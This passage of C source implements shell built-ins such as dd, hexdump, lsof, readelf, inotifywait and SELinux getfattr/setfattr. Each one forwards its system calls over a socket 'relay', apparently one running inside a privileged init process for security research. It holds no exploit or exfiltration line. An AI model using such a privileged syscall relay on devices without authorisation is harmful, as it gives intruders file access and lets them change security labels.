    if (argc < 2) return 1;

    /* Strip trailing ] if invoked as [ */
    int end = argc;
    if (strcmp(argv[0], "[") == 0 && end > 1 && strcmp(argv[end-1], "]") == 0)
        end--;

    if (end == 2) {
        /* test <string> — true if non-empty */
        return (argv[1][0] != '\0') ? 0 : 1;
    }

    if (end == 3) {
        const char *op = argv[1];
        /* Unary operators */
        if (strcmp(op, "-z") == 0) return (strlen(argv[2]) == 0) ? 0 : 1;
        if (strcmp(op, "-n") == 0) return (strlen(argv[2]) > 0) ? 0 : 1;
        if (strcmp(op, "-e") == 0 || strcmp(op, "-f") == 0 || strcmp(op, "-d") == 0) {
            char abs[CWD_SIZE];
            resolve_path(argv[2], abs);
            uint8_t statbuf[128];
            int64_t ret = relay_fstatat(sock, abs, statbuf, sizeof(statbuf));
            if (ret < 0) return 1;
            if (strcmp(op, "-e") == 0) return 0;
            uint32_t mode = unpack_u32(statbuf + 16);
            if (strcmp(op, "-f") == 0) return ((mode & 0xF000) == 0x8000) ? 0 : 1;
            if (strcmp(op, "-d") == 0) return ((mode & 0xF000) == 0x4000) ? 0 : 1;
        }
        if (strcmp(op, "-r") == 0 || strcmp(op, "-w") == 0 || strcmp(op, "-x") == 0) {
            char abs[CWD_SIZE];
            resolve_path(argv[2], abs);
            uint8_t statbuf[128];
            int64_t ret = relay_fstatat(sock, abs, statbuf, sizeof(statbuf));
            return (ret >= 0) ? 0 : 1; /* Simplified: init can access everything */
        }
        if (strcmp(op, "!") == 0) {
            return (argv[2][0] != '\0') ? 1 : 0;
        }
    }

    if (end == 4) {
        const char *op = argv[2];
        /* Binary operators */
        if (strcmp(op, "=") == 0 || strcmp(op, "==") == 0)
            return (strcmp(argv[1], argv[3]) == 0) ? 0 : 1;
        if (strcmp(op, "!=") == 0)
            return (strcmp(argv[1], argv[3]) != 0) ? 0 : 1;
        if (strcmp(op, "-eq") == 0)
            return (atol(argv[1]) == atol(argv[3])) ? 0 : 1;
        if (strcmp(op, "-ne") == 0)
            return (atol(argv[1]) != atol(argv[3])) ? 0 : 1;
        if (strcmp(op, "-lt") == 0)
            return (atol(argv[1]) < atol(argv[3])) ? 0 : 1;
        if (strcmp(op, "-gt") == 0)
            return (atol(argv[1]) > atol(argv[3])) ? 0 : 1;
        if (strcmp(op, "-le") == 0)
            return (atol(argv[1]) <= atol(argv[3])) ? 0 : 1;
        if (strcmp(op, "-ge") == 0)
            return (atol(argv[1]) >= atol(argv[3])) ? 0 : 1;
    }

    fprintf(stderr, "test: unrecognized expression\n");
    return 2;
}

static int cmd_expr(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 4) {
        fprintf(stderr, "expr: Usage: expr <val> <op> <val>\n");
        return 1;
    }

    long a = atol(argv[1]);
    const char *op = argv[2];
    long b = atol(argv[3]);

    if (strcmp(op, "+") == 0) printf("%ld\n", a + b);
    else if (strcmp(op, "-") == 0) printf("%ld\n", a - b);
    else if (strcmp(op, "*") == 0) printf("%ld\n", a * b);
    else if (strcmp(op, "/") == 0) {
        if (b == 0) { fprintf(stderr, "expr: division by zero\n"); return 1; }
        printf("%ld\n", a / b);
    }
    else if (strcmp(op, "%") == 0) {
        if (b == 0) { fprintf(stderr, "expr: division by zero\n"); return 1; }
        printf("%ld\n", a % b);
    }
    else { fprintf(stderr, "expr: unknown operator: %s\n", op); return 1; }
    return 0;
}

static int cmd_env(int sock, int argc, char *argv[]) {
    return cmd_printenv(sock, argc, argv);
}

static int cmd_which(int sock, int argc, char *argv[]) {
    (void)sock;
    if (argc < 2) { fprintf(stderr, "which: missing command name\n"); return 1; }

    for (int ci = 0; commands[ci].name; ci++) {
        if (strcmp(commands[ci].name, argv[1]) == 0) {
            printf("%s: relay built-in\n", argv[1]);
            return 0;
        }
    }
    fprintf(stderr, "%s: not found\n", argv[1]);
    return 1;
}

static int cmd_clear(int sock, int argc, char *argv[]) {
    (void)sock; (void)argc; (void)argv;
    printf("\033[2J\033[H");
    fflush(stdout);
    return 0;
}

static int cmd_time(int sock, int argc, char *argv[]) {
    if (argc < 2) { fprintf(stderr, "time: missing command\n"); return 1; }

    struct timeval t1, t2;
    gettimeofday(&t1, NULL);

    /* Look up and execute the inner command */
    for (int ci = 0; commands[ci].name; ci++) {
        if (strcmp(commands[ci].name, argv[1]) == 0) {
            commands[ci].func(sock, argc - 1, argv + 1);
            break;
        }
    }

    gettimeofday(&t2, NULL);
    double elapsed = (double)(t2.tv_sec - t1.tv_sec) +
                     (double)(t2.tv_usec - t1.tv_usec) / 1000000.0;
    fprintf(stderr, "\nreal\t%.3fs\n", elapsed);
    return 0;
}

static int cmd_xargs(int sock, int argc, char *argv[]) {
    /* Read a file line-by-line and execute cmd for each line */
    if (argc < 3) {
        fprintf(stderr, "xargs: Usage: xargs <file> <cmd> [args...]\n");
        fprintf(stderr, "  Reads lines from <file> and appends each as arg to <cmd>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(argv[1], abs);

    uint8_t *data;
    ssize_t sz = relay_read_file(sock, abs, &data, 0);
    if (sz < 0) {
        fprintf(stderr, "xargs: %s: %s\n", abs, errno_str((int)(-sz)));
        return 1;
    }

    ssize_t line_start = 0;
    for (ssize_t j = 0; j <= sz; j++) {
        if (j == sz || data[j] == '\n') {
            size_t llen = (size_t)(j - line_start);
            if (llen == 0) { line_start = j + 1; continue; }

            char line[4096];
            if (llen >= sizeof(line)) llen = sizeof(line) - 1;
            memcpy(line, data + line_start, llen);
            line[llen] = '\0';

            /* Build new argv: cmd [original_args] <line> */
            char *new_argv[MAX_ARGS];
            int new_argc = 0;
            for (int i = 2; i < argc && new_argc < MAX_ARGS - 1; i++)
                new_argv[new_argc++] = argv[i];
            new_argv[new_argc++] = line;

            /* Find and execute the command */
            for (int ci = 0; commands[ci].name; ci++) {
                if (strcmp(commands[ci].name, new_argv[0]) == 0) {
                    commands[ci].func(sock, new_argc, new_argv);
                    break;
                }
            }

            line_start = j + 1;
        }
    }

    free(data);
    return 0;
}


/* ═══════════════════════════════════════════════════════════════════════════
 * NEW COMMANDS — Security Research & Analysis
 * ═══════════════════════════════════════════════════════════════════════════ */

/* lsof: list open file descriptors for a PID */
static int cmd_lsof(int sock, int argc, char *argv[]) {
    const char *pid_str = NULL;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
            pid_str = argv[++i];
        } else if (!pid_str) {
            pid_str = argv[i];
        }
    }

    if (!pid_str) {
        fprintf(stderr, "lsof: Usage: lsof [-p] <pid>\n");
        return 1;
    }

    char fd_dir[128];
    snprintf(fd_dir, sizeof(fd_dir), "/proc/%s/fd", pid_str);

    int64_t fd = relay_openat(sock, fd_dir, MY_O_RDONLY | MY_O_DIRECTORY, 0);
    if (fd < 0) {
        fprintf(stderr, "lsof: cannot open %s: %s\n", fd_dir, errno_str((int)(-fd)));
        return 1;
    }

    printf("%-6s %-4s %s\n", "PID", "FD", "TARGET");

    for (;;) {
        uint8_t buf[DATA_SIZE];
        int64_t nbytes = relay_getdents64(sock, fd, buf, DATA_SIZE);
        if (nbytes <= 0) break;

        size_t pos = 0;
        while (pos < (size_t)nbytes) {
            if (g_sigint) break;
            uint16_t d_reclen = unpack_u32(buf + pos + 16) & 0xFFFF;
            const char *d_name = (const char *)(buf + pos + 19);
            if (d_reclen == 0) break;

            if (d_name[0] != '.') {
                char link_path[256];
                snprintf(link_path, sizeof(link_path), "/proc/%s/fd/%s", pid_str, d_name);
                char target[512] = "?";
                relay_readlinkat(sock, link_path, target, sizeof(target));
                printf("%-6s %-4s %s\n", pid_str, d_name, target);
            }
            pos += d_reclen;
        }
    }
    relay_close(sock, fd);
    return 0;
}

/* strace-like: show last syscall from /proc/PID/syscall */
static int cmd_syscall(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "syscall: Usage: syscall <pid>\n");
        return 1;
    }

    char path[128];
    snprintf(path, sizeof(path), "/proc/%s/syscall", argv[1]);
    uint8_t *data;
    ssize_t sz = relay_read_file(sock, path, &data, 512);
    if (sz < 0) {
        fprintf(stderr, "syscall: %s: %s\n", path, errno_str((int)(-sz)));
        return 1;
    }
    data[sz] = '\0';
    printf("PID %s syscall: %s", argv[1], (char *)data);
    if (sz > 0 && data[sz-1] != '\n') putchar('\n');
    free(data);
    return 0;
}

/* hexdump: hex dump of file contents (like hd/od) */
static int cmd_hexdump(int sock, int argc, char *argv[]) {
    int canonical = 1; /* -C style is default */
    int64_t skip_bytes = 0;
    int64_t length = -1;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-C") == 0) canonical = 1;
        else if (strcmp(argv[i], "-s") == 0 && i + 1 < argc)
            skip_bytes = strtoll(argv[++i], NULL, 0);
        else if (strcmp(argv[i], "-n") == 0 && i + 1 < argc)
            length = strtoll(argv[++i], NULL, 0);
        else file = argv[i];
    }

    if (!file) { fprintf(stderr, "hexdump: missing file operand\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "hexdump: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    if (skip_bytes > 0) {
        relay_lseek(sock, fd, skip_bytes, 0 /* SEEK_SET */);
    }

    size_t offset = (size_t)skip_bytes;
    int64_t remaining = length;
    for (;;) {
        if (g_sigint) break;
        if (length >= 0 && remaining <= 0) break;

        uint8_t buf[DATA_SIZE];
        size_t want = DATA_SIZE;
        if (length >= 0 && (int64_t)want > remaining) want = (size_t)remaining;
        int64_t n = relay_read(sock, fd, buf, want);
        if (n <= 0) break;

        if (canonical) {
            for (int64_t j = 0; j < n; j += 16) {
                printf("%08zx  ", offset + (size_t)j);
                for (int k = 0; k < 16; k++) {
                    if (j + k < n) printf("%02x ", buf[j + k]);
                    else printf("   ");
                    if (k == 7) putchar(' ');
                }
                printf(" |");
                for (int k = 0; k < 16 && j + k < n; k++) {
                    unsigned char c = buf[j + k];
                    putchar((c >= 32 && c < 127) ? (char)c : '.');
                }
                printf("|\n");
            }
        }
        offset += (size_t)n;
        if (length >= 0) remaining -= n;
        if ((size_t)n < want) break;
    }
    printf("%08zx\n", offset);

    relay_close(sock, fd);
    fflush(stdout);
    return 0;
}

/* dd: block-level copy with skip/seek/bs/count */
static int cmd_dd(int sock, int argc, char *argv[]) {
    const char *if_path = NULL;
    const char *of_path = NULL;
    size_t bs = 512;
    int64_t skip_blocks = 0;
    int64_t seek_blocks = 0;
    int64_t count = -1;

    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "if=", 3) == 0) if_path = argv[i] + 3;
        else if (strncmp(argv[i], "of=", 3) == 0) of_path = argv[i] + 3;
        else if (strncmp(argv[i], "bs=", 3) == 0) bs = (size_t)strtoul(argv[i] + 3, NULL, 0);
        else if (strncmp(argv[i], "skip=", 5) == 0) skip_blocks = strtoll(argv[i] + 5, NULL, 0);
        else if (strncmp(argv[i], "seek=", 5) == 0) seek_blocks = strtoll(argv[i] + 5, NULL, 0);
        else if (strncmp(argv[i], "count=", 6) == 0) count = strtoll(argv[i] + 6, NULL, 0);
    }

    if (!if_path) {
        fprintf(stderr, "dd: Usage: dd if=<input> [of=<output>] [bs=N] [skip=N] [seek=N] [count=N]\n");
        return 1;
    }

    /* Cap bs to DATA_SIZE; treat 0 as default 512 */
    if (bs == 0) bs = 512;
    if (bs > DATA_SIZE) bs = DATA_SIZE;

    /* When of= is omitted, output goes to stdout (matching toybox dd behavior).
     * ofd == -1 signals "write to stdout" in the copy loop below. */
    int stdout_mode = (of_path == NULL);

    char abs_if[CWD_SIZE], abs_of[CWD_SIZE];
    resolve_path(if_path, abs_if);
    if (of_path) resolve_path(of_path, abs_of);

    int64_t ifd = relay_openat(sock, abs_if, MY_O_RDONLY, 0);
    if (ifd == INT64_MIN) {
        fprintf(stderr, "dd: relay connection lost\n");
        return 1;
    }
    if (ifd < 0) {
        fprintf(stderr, "dd: cannot open '%s': %s\n", abs_if, errno_str((int)(-ifd)));
        return 1;
    }

    int64_t ofd = -1;
    if (!stdout_mode) {
        ofd = relay_openat(sock, abs_of, MY_O_WRONLY | MY_O_CREAT | MY_O_TRUNC, 0644);
        if (ofd == INT64_MIN) {
            fprintf(stderr, "dd: relay connection lost\n");
            return 1;
        }
        if (ofd < 0) {
            fprintf(stderr, "dd: cannot open '%s': %s\n", abs_of, errno_str((int)(-ofd)));
            relay_close(sock, ifd);
            return 1;
        }
    }

    /* Skip input blocks */
    if (skip_blocks > 0) {
        int64_t sr = relay_lseek(sock, ifd, skip_blocks * (int64_t)bs, 0 /* SEEK_SET */);
        if (sr == INT64_MIN) {
            fprintf(stderr, "dd: relay connection lost during seek\n");
            return 1;
        }
        if (sr < 0) {
            fprintf(stderr, "dd: skip seek failed: %s\n", errno_str((int)(-sr)));
            relay_close(sock, ifd);
            relay_close(sock, ofd);
            return 1;
        }
    }

    /* Seek output blocks (only when writing to a file, not stdout) */
    if (seek_blocks > 0 && !stdout_mode) {
        int64_t sr = relay_lseek(sock, ofd, seek_blocks * (int64_t)bs, 0 /* SEEK_SET */);
        if (sr == INT64_MIN) {
            fprintf(stderr, "dd: relay connection lost during seek\n");
            return 1;
        }
        if (sr < 0) {
            fprintf(stderr, "dd: seek failed: %s\n", errno_str((int)(-sr)));
            relay_close(sock, ifd);
            relay_close(sock, ofd);
            return 1;
        }
    }

    uint64_t total_bytes = 0;
    int64_t blocks_done = 0;
    int relay_dead = 0;

    struct timeval t1, t2;
    gettimeofday(&t1, NULL);

    while (count < 0 || blocks_done < count) {
        if (g_sigint) break;
        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, ifd, buf, bs);
        if (n == INT64_MIN) { relay_dead = 1; break; }
        if (n <= 0) break;

        int64_t w;
        if (stdout_mode) {
            /* Write to stdout — for piping (e.g., dd if=PATH bs=1 count=N | base64) */
            size_t written = fwrite(buf, 1, (size_t)n, stdout);
            w = (int64_t)written;
            if (written < (size_t)n) {
                fprintf(stderr, "dd: stdout write error\n");
                break;
            }
        } else {
            w = relay_write(sock, ofd, buf, (size_t)n);
            if (w == INT64_MIN) { relay_dead = 1; break; }
            if (w < 0) { fprintf(stderr, "dd: write error: %s\n", errno_str((int)(-w))); break; }
        }

        total_bytes += (uint64_t)n;
        blocks_done++;

        if ((size_t)n < bs) break;
    }

    if (stdout_mode) fflush(stdout);

    if (relay_dead) {
        fprintf(stderr, "dd: relay connection lost during copy\n");
    } else {
        relay_close(sock, ifd);
        if (!stdout_mode) relay_close(sock, ofd);
    }

    gettimeofday(&t2, NULL);
    double elapsed = (double)(t2.tv_sec - t1.tv_sec) +
                     (double)(t2.tv_usec - t1.tv_usec) / 1000000.0;

    fprintf(stderr, "%lld+0 records in\n", (long long)blocks_done);
    fprintf(stderr, "%lld+0 records out\n", (long long)blocks_done);
    fprintf(stderr, "%llu bytes transferred in %.3f secs",
            (unsigned long long)total_bytes, elapsed);
    if (elapsed > 0.001)
        fprintf(stderr, " (%.0f bytes/sec)", (double)total_bytes / elapsed);
    fprintf(stderr, "\n");

    return relay_dead ? -1 : 0;
}

/* sha256sum: compute SHA-256 checksum of a file */
static int cmd_sha256sum(int sock, int argc, char *argv[]) {
    for (int fi = 1; fi < argc; fi++) {
        if (argv[fi][0] == '-') continue;

        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "sha256sum: %s: %s\n", abs, errno_str((int)(-fd)));
            continue;
        }

        sha256_ctx ctx;
        sha256_init(&ctx);

        for (;;) {
            if (g_sigint) break;
            uint8_t buf[DATA_SIZE];
            int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
            if (n <= 0) break;
            sha256_update(&ctx, buf, (size_t)n);
            if ((size_t)n < DATA_SIZE) break;
        }
        relay_close(sock, fd);

        uint8_t hash[32];
        sha256_final(&ctx, hash);

        for (int j = 0; j < 32; j++) printf("%02x", hash[j]);
        printf("  %s\n", argv[fi]);
    }
    return 0;
}

/* md5sum: compute MD5 checksum of a file */
static int cmd_md5sum(int sock, int argc, char *argv[]) {
    for (int fi = 1; fi < argc; fi++) {
        if (argv[fi][0] == '-') continue;

        char abs[CWD_SIZE];
        resolve_path(argv[fi], abs);

        int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
        if (fd < 0) {
            fprintf(stderr, "md5sum: %s: %s\n", abs, errno_str((int)(-fd)));
            continue;
        }

        md5_ctx ctx;
        md5_init(&ctx);

        for (;;) {
            if (g_sigint) break;
            uint8_t buf[DATA_SIZE];
            int64_t n = relay_read(sock, fd, buf, DATA_SIZE);
            if (n <= 0) break;
            md5_update(&ctx, buf, (size_t)n);
            if ((size_t)n < DATA_SIZE) break;
        }
        relay_close(sock, fd);

        uint8_t hash[16];
        md5_final(&ctx, hash);

        for (int j = 0; j < 16; j++) printf("%02x", hash[j]);
        printf("  %s\n", argv[fi]);
    }
    return 0;
}

/* getfattr: get extended attributes (SELinux labels etc.) */
static int cmd_getfattr(int sock, int argc, char *argv[]) {
    const char *attr_name = "security.selinux";
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc)
            attr_name = argv[++i];
        else if (strcmp(argv[i], "--only-values") == 0)
            ; /* ignored for simplicity */
        else
            file = argv[i];
    }

    if (!file) {
        fprintf(stderr, "getfattr: Usage: getfattr [-n name] <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    char value[1024];
    memset(value, 0, sizeof(value));
    int64_t ret = relay_lgetxattr(sock, abs, attr_name, value, sizeof(value) - 1);
    if (ret < 0) {
        fprintf(stderr, "getfattr: %s: %s: %s\n", abs, attr_name, errno_str((int)(-ret)));
        return 1;
    }

    printf("# file: %s\n", abs);
    printf("%s=\"%s\"\n", attr_name, value);
    return 0;
}

/* setfattr: set extended attributes */
static int cmd_setfattr(int sock, int argc, char *argv[]) {
    const char *attr_name = NULL;
    const char *attr_value = NULL;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-n") == 0 && i + 1 < argc)
            attr_name = argv[++i];
        else if (strcmp(argv[i], "-v") == 0 && i + 1 < argc)
            attr_value = argv[++i];
        else
            file = argv[i];
    }

    if (!attr_name || !attr_value || !file) {
        fprintf(stderr, "setfattr: Usage: setfattr -n <name> -v <value> <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    /* Use lsetxattr: same as chcon but for any attribute */
    size_t plen = strlen(abs) + 1;
    size_t p_padded = (plen + 7) & ~(size_t)7;
    size_t nlen = strlen(attr_name) + 1;
    size_t n_padded = (nlen + 7) & ~(size_t)7;
    size_t vlen = strlen(attr_value) + 1;

    if (p_padded + n_padded + vlen > DATA_SIZE) {
        fprintf(stderr, "setfattr: data too long\n");
        return 1;
    }

    uint8_t dbuf[DATA_SIZE];
    memset(dbuf, 0, sizeof(dbuf));
    memcpy(dbuf, abs, plen);
    memcpy(dbuf + p_padded, attr_name, nlen);
    memcpy(dbuf + p_padded + n_padded, attr_value, vlen);

    int64_t ret = send_syscall(sock, SYS_lsetxattr,
                               0, (uint64_t)p_padded, (uint64_t)(p_padded + n_padded),
                               (uint64_t)vlen, 0, 0,
                               FLAG_X0_DATA | FLAG_X1_DATA | FLAG_X2_DATA,
                               dbuf, p_padded + n_padded + vlen,
                               NULL, 0);
    if (ret < 0) {
        fprintf(stderr, "setfattr: %s: %s\n", abs, errno_str((int)(-ret)));
        return 1;
    }
    return 0;
}

/* readelf: basic ELF header reader */
static int cmd_readelf(int sock, int argc, char *argv[]) {
    int show_header = 1;
    int show_sections = 0;
    int show_program = 0;
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') {
            for (const char *f = argv[i] + 1; *f; f++) {
                if (*f == 'h') show_header = 1;
                else if (*f == 'S') show_sections = 1;
                else if (*f == 'l') show_program = 1;
                else if (*f == 'a') { show_header = 1; show_sections = 1; show_program = 1; }
            }
        } else {
            file = argv[i];
        }
    }

    if (!file) { fprintf(stderr, "readelf: Usage: readelf [-hSla] <file>\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "readelf: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
    }

    /* Read first 64 bytes (ELF header) */
    uint8_t ehdr[64];
    memset(ehdr, 0, sizeof(ehdr));
    int64_t n = relay_read(sock, fd, ehdr, 64);
    if (n < 16 || ehdr[0] != 0x7F || ehdr[1] != 'E' || ehdr[2] != 'L' || ehdr[3] != 'F') {
        fprintf(stderr, "readelf: %s: not an ELF file\n", abs);
        relay_close(sock, fd);
        return 1;
    }

    int is64 = (ehdr[4] == 2);
    int isle = (ehdr[5] == 1);
    (void)isle;

    if (show_header) {
        printf("ELF Header:\n");
        printf("  Magic:   ");
        for (int j = 0; j < 16; j++) printf("%02x ", ehdr[j]);
        printf("\n");

        const char *class_str = is64 ? "ELF64" : "ELF32";
        const char *data_str = isle ? "2's complement, little endian" : "2's complement, big endian";

        printf("  Class:                             %s\n", class_str);
        printf("  Data:                              %s\n", data_str);
        printf("  Version:                           %d (current)\n", ehdr[6]);

        const char *osabi = "UNIX";
        switch (ehdr[7]) {
            case 0: osabi = "UNIX - System V"; break;
            case 3: osabi = "UNIX - GNU"; break;
            case 97: osabi = "ARM"; break;
        }
        printf("  OS/ABI:                            %s\n", osabi);

        if (is64 && n >= 64) {
            uint16_t e_type = (uint16_t)(ehdr[16] | (ehdr[17] << 8));
            uint16_t e_machine = (uint16_t)(ehdr[18] | (ehdr[19] << 8));
            uint64_t e_entry = unpack_u64(ehdr + 24);
            uint64_t e_phoff = unpack_u64(ehdr + 32);
            uint64_t e_shoff = unpack_u64(ehdr + 40);
            uint16_t e_phnum = (uint16_t)(ehdr[56] | (ehdr[57] << 8));
            uint16_t e_shnum = (uint16_t)(ehdr[60] | (ehdr[61] << 8));

            const char *type_str = "NONE";
            switch (e_type) {
                case 1: type_str = "REL (Relocatable file)"; break;
                case 2: type_str = "EXEC (Executable file)"; break;
                case 3: type_str = "DYN (Shared object file)"; break;
                case 4: type_str = "CORE (Core file)"; break;
            }

            const char *mach_str = "Unknown";
            switch (e_machine) {
                case 3: mach_str = "Intel 80386"; break;
                case 40: mach_str = "ARM"; break;
                case 62: mach_str = "Advanced Micro Devices X86-64"; break;
                case 183: mach_str = "AArch64"; break;
            }

            printf("  Type:                              %s\n", type_str);
            printf("  Machine:                           %s\n", mach_str);
            printf("  Entry point address:               0x%llx\n", (unsigned long long)e_entry);
            printf("  Start of program headers:          %llu (bytes into file)\n",
                   (unsigned long long)e_phoff);
            printf("  Start of section headers:          %llu (bytes into file)\n",
                   (unsigned long long)e_shoff);
            printf("  Number of program headers:         %u\n", e_phnum);
            printf("  Number of section headers:         %u\n", e_shnum);
        }
    }

    if (show_program && is64 && n >= 64) {
        uint64_t e_phoff = unpack_u64(ehdr + 32);
        uint16_t e_phentsize = (uint16_t)(ehdr[54] | (ehdr[55] << 8));
        uint16_t e_phnum = (uint16_t)(ehdr[56] | (ehdr[57] << 8));

        printf("\nProgram Headers:\n");
        printf("  %-14s %-18s %-18s %-10s %-6s\n",
               "Type", "Offset", "VirtAddr", "FileSiz", "Flags");

        for (int i = 0; i < e_phnum && i < 32; i++) {
            relay_lseek(sock, fd, (int64_t)(e_phoff + (uint64_t)i * e_phentsize), 0);
            uint8_t phdr[56];
            memset(phdr, 0, sizeof(phdr));
            relay_read(sock, fd, phdr, 56);

            uint32_t p_type = unpack_u32(phdr);
            uint32_t p_flags = unpack_u32(phdr + 4);
            uint64_t p_offset = unpack_u64(phdr + 8);
            uint64_t p_vaddr = unpack_u64(phdr + 16);
            uint64_t p_filesz = unpack_u64(phdr + 32);

            const char *tstr = "UNKNOWN";
            switch (p_type) {
                case 0: tstr = "NULL"; break;
                case 1: tstr = "LOAD"; break;
                case 2: tstr = "DYNAMIC"; break;
                case 3: tstr = "INTERP"; break;
                case 4: tstr = "NOTE"; break;
                case 6: tstr = "PHDR"; break;
                case 7: tstr = "TLS"; break;
                case 0x6474e550: tstr = "GNU_EH_FRAME"; break;
                case 0x6474e551: tstr = "GNU_STACK"; break;
                case 0x6474e552: tstr = "GNU_RELRO"; break;
            }

            char flags_str[4] = "   ";
            if (p_flags & 4) flags_str[0] = 'R';
            if (p_flags & 2) flags_str[1] = 'W';
            if (p_flags & 1) flags_str[2] = 'E';

            printf("  %-14s 0x%016llx 0x%016llx 0x%08llx %s\n",
                   tstr, (unsigned long long)p_offset,
                   (unsigned long long)p_vaddr,
                   (unsigned long long)p_filesz, flags_str);
        }
    }

    if (show_sections && is64 && n >= 64) {
        uint64_t e_shoff = unpack_u64(ehdr + 40);
        uint16_t e_shentsize = (uint16_t)(ehdr[58] | (ehdr[59] << 8));
        uint16_t e_shnum = (uint16_t)(ehdr[60] | (ehdr[61] << 8));

        printf("\nSection Headers:\n");
        printf("  [Nr] %-18s %-10s %-18s %-8s\n", "Name", "Type", "Address", "Size");

        for (int i = 0; i < e_shnum && i < 64; i++) {
            relay_lseek(sock, fd, (int64_t)(e_shoff + (uint64_t)i * e_shentsize), 0);
            uint8_t shdr[64];
            memset(shdr, 0, sizeof(shdr));
            relay_read(sock, fd, shdr, 64);

            uint32_t sh_name = unpack_u32(shdr);
            uint32_t sh_type = unpack_u32(shdr + 4);
            uint64_t sh_addr = unpack_u64(shdr + 16);
            uint64_t sh_size = unpack_u64(shdr + 32);

            const char *tstr = "UNKNOWN";
            switch (sh_type) {
                case 0: tstr = "NULL"; break;
                case 1: tstr = "PROGBITS"; break;
                case 2: tstr = "SYMTAB"; break;
                case 3: tstr = "STRTAB"; break;
                case 4: tstr = "RELA"; break;
                case 5: tstr = "HASH"; break;
                case 6: tstr = "DYNAMIC"; break;
                case 7: tstr = "NOTE"; break;
                case 8: tstr = "NOBITS"; break;
                case 9: tstr = "REL"; break;
                case 11: tstr = "DYNSYM"; break;
                case 14: tstr = "INIT_ARRAY"; break;
                case 15: tstr = "FINI_ARRAY"; break;
            }

            printf("  [%2d] name_off=%-8u %-10s 0x%016llx 0x%llx\n",
                   i, sh_name, tstr,
                   (unsigned long long)sh_addr, (unsigned long long)sh_size);
        }
    }

    relay_close(sock, fd);
    return 0;
}

/* inotifywait: file change monitoring via inotify syscalls */
static int cmd_inotifywait(int sock, int argc, char *argv[]) {
    int monitor = 0;
    int timeout_ms = 10000; /* default 10s */
    const char *file = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-m") == 0) monitor = 1;
        else if (strcmp(argv[i], "-t") == 0 && i + 1 < argc)
            timeout_ms = atoi(argv[++i]) * 1000;
        else file = argv[i];
    }

    if (!file) {
        fprintf(stderr, "inotifywait: Usage: inotifywait [-m] [-t secs] <path>\n");
        return 1;
    }

    char abs[CWD_SIZE];
    resolve_path(file, abs);

    int64_t ifd = relay_inotify_init1(sock, IN_NONBLOCK);
    if (ifd < 0) {
        fprintf(stderr, "inotifywait: inotify_init failed: %s\n", errno_str((int)(-ifd)));
        return 1;
    }

    int64_t wd = relay_inotify_add_watch(sock, ifd, abs, IN_ALL_EVENTS);
    if (wd < 0) {
        fprintf(stderr, "inotifywait: add_watch failed: %s\n", errno_str((int)(-wd)));
        relay_close(sock, ifd);
        return 1;
    }

    printf("Setting up watches on %s...\n", abs);

    int loops = monitor ? 1000000 : (timeout_ms / 100);
    for (int i = 0; i < loops; i++) {
        if (g_sigint) break;

        uint8_t buf[DATA_SIZE];
        int64_t n = relay_read(sock, ifd, buf, DATA_SIZE);
        if (n > 0) {
            size_t pos = 0;
            while (pos + 16 <= (size_t)n) {
                uint32_t ev_mask = unpack_u32(buf + pos + 4);
                uint32_t ev_len = unpack_u32(buf + pos + 12);
                const char *ev_name = (ev_len > 0) ? (const char *)(buf + pos + 16) : "";

                printf("%s ", abs);
                if (ev_mask & IN_ACCESS) printf("ACCESS ");
                if (ev_mask & IN_MODIFY) printf("MODIFY ");
                if (ev_mask & IN_ATTRIB) printf("ATTRIB ");
                if (ev_mask & IN_CLOSE_WRITE) printf("CLOSE_WRITE ");
                if (ev_mask & IN_CLOSE_NOWRITE) printf("CLOSE_NOWRITE ");
                if (ev_mask & IN_OPEN) printf("OPEN ");
                if (ev_mask & IN_MOVED_FROM) printf("MOVED_FROM ");
                if (ev_mask & IN_MOVED_TO) printf("MOVED_TO ");
                if (ev_mask & IN_CREATE) printf("CREATE ");
                if (ev_mask & IN_DELETE) printf("DELETE ");
                if (ev_mask & IN_DELETE_SELF) printf("DELETE_SELF ");
                if (ev_name[0]) printf("%s", ev_name);
                printf("\n");

                pos += 16 + ev_len;
                if (!monitor) goto inotify_done;
            }
        }
        usleep(100000); /* 100ms poll interval */
    }

inotify_done:
    relay_close(sock, ifd);
    return 0;
}

/* blockdev: block device info via ioctl */
static int cmd_blockdev(int sock, int argc, char *argv[]) {
    if (argc < 2) {
        fprintf(stderr, "blockdev: Usage: blockdev --getsize64|--getss|--getro <device>\n");
        return 1;
    }

    const char *op = NULL;
    const char *dev = NULL;

    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') op = argv[i];
        else dev = argv[i];
    }

    if (!dev) { fprintf(stderr, "blockdev: missing device\n"); return 1; }

    char abs[CWD_SIZE];
    resolve_path(dev, abs);

    int64_t fd = relay_openat(sock, abs, MY_O_RDONLY, 0);
    if (fd < 0) {
        fprintf(stderr, "blockdev: %s: %s\n", abs, errno_str((int)(-fd)));
        return 1;
